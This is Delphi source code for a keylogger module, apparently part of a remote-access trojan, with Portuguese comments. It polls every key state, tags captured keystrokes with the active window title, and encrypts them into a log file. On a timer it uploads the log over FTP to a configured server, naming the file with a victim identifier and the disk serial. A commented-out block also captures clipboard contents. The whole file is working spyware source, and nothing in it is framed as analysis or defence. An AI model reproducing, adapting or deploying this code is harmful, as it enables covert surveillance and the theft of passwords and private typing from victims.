unit UnitKeylogger;

interface

uses
  windows,
  UnitSettings,
  UnitDiversos,
  UnitServerUtils,
  UnitInformacoes,
  uFTP;

var
  LogsFile: string;
  DecryptedLog: string;
  loggedkeys: string;

procedure logthekeys();
procedure TimerProc2;
procedure startkeylogger(p: pointer);
Function GetCharFromVKey( vkey: word ): String;
procedure StartMailSend;


implementation

uses
  UnitExecutarComandos,
  UnitCarregarFuncoes,
  UnitCryptString,
  UnitComandos;

var
  acento: integer;
  Tamanholog: integer;
  OldCaption: string;
  Digitou: boolean;
  F: Textfile;
  WNDCaption : string;
  MSG2: TMSG;
  proibido: array [8..255] of string;
  linguagem: string;
  LastClipBoardBuffer: string = '';

procedure StartMailSend;
var
  ftp: tFtpAccess;
  Thefile, // Nome do arquivo
  filedata: string; // buffer do arquivo
  c: cardinal;
  MailFile: string;
begin
  if mp_MemoryModule = nil then exit;
  if (MyGetFileSize(LogsFile) > 0) and
     (KeyloggerThread <> 0) and
     (EnviarPorFTP = true) then
  begin
    MailFile := extractfilepath(LogsFile) + inttostr(gettickcount) + '.txt';
    copyfile(pchar(LogsFile), pchar(MailFile), false);
    SetFileAttributes(PChar(MailFile), FILE_ATTRIBUTE_NORMAL);
    filedata := lerarquivo(MailFile, c);
    MyDeleteFile(MailFile);
    if filedata = '' then exit;
    Thefile := NewIdentification + '_' + ExtractDiskSerial(myrootfolder);
    Thefile := Thefile + '_' + getday + '-' + getmonth + '-' + getyear + '___' + gethour + '-' + getminute + '-' + getsecond;

    ftp := tFtpAccess.create(FTPAddress,
                             FTPUser,
                             FTPPass,
                             FTPPort);
    if (not assigned(ftp)) or (not ftp.connected) then
    begin
      ftp.Free;
      exit;
    end;

    if ftp.SetDir(FTPDir) = false then
    begin
      ftp.Free;
      exit;
    end;

    // Enviando arquivo
    if not ftp.Putfile(FileData, TheFile) then
    begin
      ftp.Free;
      exit;
    end;
    ftp.free;
  end;
end;

Function GetCharFromVKey( vkey: word ): String;
var
  keystate: TKeyboardState;
  retcode: Integer;
begin
//  Win32Check( GetKeyboardState( keystate ));
  GetKeyboardState(keystate);


  SetLength( Result, 2 );
  retcode := ToAscii( vkey,
                     MapVirtualKey( vkey, 0 ),
                     keystate,
                     @Result[1],
                     0 );
  Case retcode Of
    0: Result := ''; // no character
    1: SetLength(Result, 1);
    2: ;
    Else
    Result := ''; // retcode < 0 indicates a dead key
  End;
end;

procedure logthekeys();
var
  i : byte;
  testar_acento: string;
begin
  tamanholog := length(loggedkeys);

  for i := 8 To 255 do
  begin
    if GetAsyncKeyState(i) = - 32767 then
    begin
      if proibido[i] = '~~' then
      begin
        if ((GetKeyState(VK_CAPITAL)) = 1) then
        if GetKeyState(VK_SHIFT) < 0 then

        ////////////////////////////////////////
        // o procedimento abaixo evita acentos duplos no log. Ex.: ~~~~ ´´ `` etc...
        begin
          if length(loggedkeys) > 0 then
          if loggedkeys[length(loggedkeys)] <> '~' then
          loggedkeys := loggedkeys + '~';
        end else
        begin
          if length(loggedkeys) > 0 then
          if loggedkeys[length(loggedkeys)] <> '^' then
          loggedkeys := loggedkeys + '^';
        end else

        begin
        if GetKeyState(VK_SHIFT) < 0 then
          begin
            if length(loggedkeys) > 0 then
            if loggedkeys[length(loggedkeys)] <> '^' then
            loggedkeys := loggedkeys + '^';
          end else
          begin
            if length(loggedkeys) > 0 then
            if loggedkeys[length(loggedkeys)] <> '~' then
            loggedkeys := loggedkeys + '~';
          end;
        end;

      end else
      if proibido[i] = '´´' then
      begin
        if ((GetKeyState(VK_CAPITAL)) = 1) then
        if GetKeyState(VK_SHIFT) < 0 then

        begin
          if length(loggedkeys) > 0 then
          if loggedkeys[length(loggedkeys)] <> '´' then
          loggedkeys := loggedkeys + '´';
        end else
        begin
          if length(loggedkeys) > 0 then
          if loggedkeys[length(loggedkeys)] <> '`' then
          loggedkeys := loggedkeys + '`' else
        end else

        begin
        if GetKeyState(VK_SHIFT) < 0 then
          begin
            if length(loggedkeys) > 0 then
            if loggedkeys[length(loggedkeys)] <> '`' then
            loggedkeys := loggedkeys + '`'
          end else
          begin
            if length(loggedkeys) > 0 then
            if loggedkeys[length(loggedkeys)] <> '´' then
            loggedkeys := loggedkeys + '´';
          end;
        end;

      end else
      ////////////////////////////////////////



      case i of
        8  :
            begin
              if ExcluirBACKSPACE = false then loggedkeys := loggedkeys +'[BACKSPACE]'
              else
              begin
                delete(loggedkeys, length(loggedkeys), 1);
                tamanholog := length(loggedkeys);
              end;
            end;
        9  : loggedkeys := loggedkeys + '(TAB)';
        13 : loggedkeys := loggedkeys + #13#10;
        17 : loggedkeys := loggedkeys + '(Ctrl)';
        19 : loggedkeys := loggedkeys + '(Pause/Break)';
        20 : loggedkeys := loggedkeys + '(Caps Lock)';
        27 : loggedkeys := loggedkeys + '(ESC)';
        32 : loggedkeys := loggedkeys + ' ';
        33 : loggedkeys := loggedkeys + '(Page up)';
        34 : loggedkeys := loggedkeys + '(Page down)';
        35 : loggedkeys := loggedkeys + '(End)';
        36 : loggedkeys := loggedkeys + '(Home)';
        37 : loggedkeys := loggedkeys + '(Left)';
        38 : loggedkeys := loggedkeys + '(Up)';
        39 : loggedkeys := loggedkeys + '(Right)';
        40 : loggedkeys := loggedkeys + '(Down)';
        44 : loggedkeys := loggedkeys + '(Prnt Scrn)';
        45 : loggedkeys := loggedkeys + '(Insert)';
        46 : loggedkeys := loggedkeys + '(Delete)';

        91 : loggedkeys := loggedkeys + '(Left Start)';
        92 : loggedkeys := loggedkeys + '(Right Start)';
        144: loggedkeys := loggedkeys + '[Num Lock]';
        145: loggedkeys := loggedkeys + '(Scroll lock)';
        162: loggedkeys := loggedkeys + '(Left Ctrl)';
        163: loggedkeys := loggedkeys + '(Right Ctrl)';
        164: loggedkeys := loggedkeys + '(Alt)';
        165: loggedkeys := loggedkeys + '(Alt Gr)';


        // esses doi abaixo que são os problemas... são os acentos
        // mas depois que eu coloquei o "proibido[i]", além de resolver os problemas
        // dos acentos tbm resolvi da linguagem dos teclados...pelo que percebi hehehe
//        219: if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + '`' else
//             loggedkeys := loggedkeys + '´';
//        222: if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + '^' else
//             loggedkeys := loggedkeys + '~';

        65: // letra A
           begin
             if length(loggedkeys) > 0 then
             begin
               if loggedkeys[length(loggedkeys)] = '´' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'á' else
                 loggedkeys := loggedkeys + 'Á' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Á'
                 else loggedkeys := loggedkeys + 'á';
               end else
               if loggedkeys[length(loggedkeys)] = '`' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'à' else
                 loggedkeys := loggedkeys + 'À' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'À'
                 else loggedkeys := loggedkeys + 'à';
               end else
               if loggedkeys[length(loggedkeys)] = '~' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ã' else
                 loggedkeys := loggedkeys + 'Ã' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ã'
                 else loggedkeys := loggedkeys + 'ã';
               end else
               if loggedkeys[length(loggedkeys)] = '^' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'â' else
                 loggedkeys := loggedkeys + 'Â' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Â'
                 else loggedkeys := loggedkeys + 'â';
               end else
               begin
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
                 loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
                 else
                 loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
               end;
             end else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
           end;

        69: // letra E
           begin
             if length(loggedkeys) > 0 then
             begin
               if loggedkeys[length(loggedkeys)] = '´' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'é' else
                 loggedkeys := loggedkeys + 'É' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'É'
                 else loggedkeys := loggedkeys + 'é';
               end else
               if loggedkeys[length(loggedkeys)] = '`' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'è' else
                 loggedkeys := loggedkeys + 'È' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'È'
                 else loggedkeys := loggedkeys + 'è';
               end else
               if loggedkeys[length(loggedkeys)] = '^' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ê' else
                 loggedkeys := loggedkeys + 'Ê' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ê'
                 else loggedkeys := loggedkeys + 'ê';
               end else
               begin
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
                 loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
                 else
                 loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
               end;
             end else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
           end;

        73: // letra I
           begin
             if length(loggedkeys) > 0 then
             begin
               if loggedkeys[length(loggedkeys)] = '´' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'í' else
                 loggedkeys := loggedkeys + 'Í' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Í'
                 else loggedkeys := loggedkeys + 'í';
               end else
               if loggedkeys[length(loggedkeys)] = '`' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ì' else
                 loggedkeys := loggedkeys + 'Ì' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ì'
                 else loggedkeys := loggedkeys + 'ì';
               end else
               if loggedkeys[length(loggedkeys)] = '^' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'î' else
                 loggedkeys := loggedkeys + 'Î' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Î'
                 else loggedkeys := loggedkeys + 'î';
               end else
               begin
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
                 loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
                 else
                 loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
               end;
             end else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
           end;

        79: // letra O
           begin
             if length(loggedkeys) > 0 then
             begin
               if loggedkeys[length(loggedkeys)] = '´' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ó' else
                 loggedkeys := loggedkeys + 'Ó' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ó'
                 else loggedkeys := loggedkeys + 'ó';
               end else
               if loggedkeys[length(loggedkeys)] = '`' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ò' else
                 loggedkeys := loggedkeys + 'Ò' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ò'
                 else loggedkeys := loggedkeys + 'ò';
               end else
               if loggedkeys[length(loggedkeys)] = '~' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'õ' else
                 loggedkeys := loggedkeys + 'Õ' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Õ'
                 else loggedkeys := loggedkeys + 'õ';
               end else
               if loggedkeys[length(loggedkeys)] = '^' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ô' else
                 loggedkeys := loggedkeys + 'Ô' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ô'
                 else loggedkeys := loggedkeys + 'ô';
               end else
               begin
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
                 loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
                 else
                 loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
               end;
             end else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
           end;

        85: // letra U
           begin
             if length(loggedkeys) > 0 then
             begin
               if loggedkeys[length(loggedkeys)] = '´' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ú' else
                 loggedkeys := loggedkeys + 'Ú' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ú'
                 else loggedkeys := loggedkeys + 'ú';
               end else
               if loggedkeys[length(loggedkeys)] = '`' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'ù' else
                 loggedkeys := loggedkeys + 'Ù' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Ù'
                 else loggedkeys := loggedkeys + 'ù';
               end else
               if loggedkeys[length(loggedkeys)] = '^' then
               begin
                 delete(loggedkeys, length(loggedkeys), 1);
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys + 'û' else
                 loggedkeys := loggedkeys + 'Û' else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + 'Û'
                 else loggedkeys := loggedkeys + 'û';
               end else
               begin
                 if ((GetKeyState(VK_CAPITAL))=1) then
                 if GetKeyState(VK_SHIFT) < 0 then
                 loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
                 loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
                 if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
                 else
                 loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
               end;
             end else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
           end;

        else
             begin
               if ((GetKeyState(VK_CAPITAL))=1) then
               if GetKeyState(VK_SHIFT) < 0 then
               loggedkeys := loggedkeys+ LowerString(GetCharFromVKey(i)) else
               loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i)) else
               if GetKeyState(VK_SHIFT) < 0 then loggedkeys := loggedkeys + UpperString(GetCharFromVKey(i))
               else
               loggedkeys := loggedkeys + LowerString(GetCharFromVKey(i));
             end;
      end;
    end;
  end;

  if copy(loggedkeys, length(loggedkeys) - 1, 2) = '´´' then
  delete(loggedkeys, length(loggedkeys), 1) else
  if copy(loggedkeys, length(loggedkeys) - 1, 2) = '``' then
  delete(loggedkeys, length(loggedkeys), 1) else
  if copy(loggedkeys, length(loggedkeys) - 1, 2) = '~~' then
  delete(loggedkeys, length(loggedkeys), 1) else
  if copy(loggedkeys, length(loggedkeys) - 1, 2) = '^^' then
  delete(loggedkeys, length(loggedkeys), 1);

  if length(loggedkeys) > tamanholog then digitou := true;
end;

Procedure CriarArquivo2(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, OPEN_EXISTING, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    SetFilePointer(hFile, 0, nil, FILE_END);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

//this procedure saves the logged keys into logfile
//with Windowcaption tag
procedure savetofile;
var
  TempStr, S: string;
begin
{
  if GetClipboardText(0, TempStr) = true then
  begin
    if TempStr <> LastClipBoardBuffer then
    begin
      LastClipBoardBuffer := TempStr;
      loggedkeys := loggedkeys + #13#10 + '[START CLIPBOARD] ' + TempStr + ' [END CLIPBOARD]' + #13#10;
    end;
  end;
}
  if not FileExists(LogsFile) Then
  begin
    S := EnDecrypt02('[LogFile]' + #13#10, MasterPassword);
    S := S + '####';
    Criararquivo(LogsFile, S, length(S));
  end;

  TempStr := '[ ' + OldCaption + ' ] ---> [ DATE/TIME: ' + getday + '/' + getmonth + '/' + getyear + ' -- ' + gethour + ':' + GetMinute + ' ]' + #13#10 + #13#10 + loggedkeys + '  ' + #13#10 + #13#10;
  DecryptedLog := DecryptedLog + TempStr;

  TempStr := EnDecrypt02(TempStr, MasterPassword) + '####';

  CriarArquivo2(LogsFile, TempStr, length(TempStr));
  loggedkeys := '';
end;

procedure TimerProc2;
var
  i: integer;
begin
  while true do
  begin
    sleep(1); // o mínimo de intervalo que eu consegui digitando foi 16... que foi mais rápido que segurando a tecla... então vou colocar o sleep em 15

    WNDCaption := ActiveCaption;
    logthekeys;

    if (gettickcount > i + 300) and (OldCaption <> WNDCaption) then
    begin
      if digitou = true then
      begin
        savetofile;
        digitou := false;
      end;
      OldCaption := WNDCaption;
      i := gettickcount;
    end;
  end;
end;

procedure startkeylogger(p: pointer);
begin
  LastClipBoardBuffer := '';
  startthread(@TimerProc2);

  while true do
  begin
    sleep(logminute * 60000);
    StartMailSend;
  end;
end;

var
  stringtemp: string;

begin
  for acento := 8 to 255 do
  begin
    stringtemp:= GetCharFromVKey(acento);
    if stringtemp = '' then
    begin
      stringtemp:= GetCharFromVKey(acento);
      if stringtemp <> '' then
      begin
        if (stringtemp = '~~') then proibido[acento] := '~~' else
        if (stringtemp = '^^') then proibido[acento] := '~~' else
        if (stringtemp = '´´') then proibido[acento] := '´´' else
        if (stringtemp = '``') then proibido[acento] := '´´';
      end;
    end;
  end;
  exit;
end.
